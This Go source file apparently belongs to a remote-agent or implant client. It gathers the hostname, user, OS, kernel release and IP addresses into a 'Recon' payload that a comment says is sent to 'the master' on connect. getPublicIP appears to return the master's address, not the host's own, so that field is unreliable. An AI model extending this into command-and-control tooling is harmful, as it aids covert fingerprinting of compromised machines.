package main

import (
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"zheng/internal/proto"
)

// gatherRecon builds the identification payload sent to the master on connect.
func gatherRecon(conn net.Conn) proto.Recon {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	return proto.Recon{
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Kernel:   kernelRelease(),
		IP:       getLocalIP(),
		PublicIP: getPublicIP(conn),
	}
}

// kernelRelease returns the uname -r style kernel release.
func kernelRelease() string {
	out, err := exec.Command("uname", "-r").Output()
	if err != nil {
		return runtime.GOOS
	}
	return strings.TrimSpace(string(out))
}

func getPublicIP(conn net.Conn) string {
	if tcpAddr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		return tcpAddr.IP.String()
	}
	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		return "unknown"
	}
	return host
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "unknown"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "unknown"
}
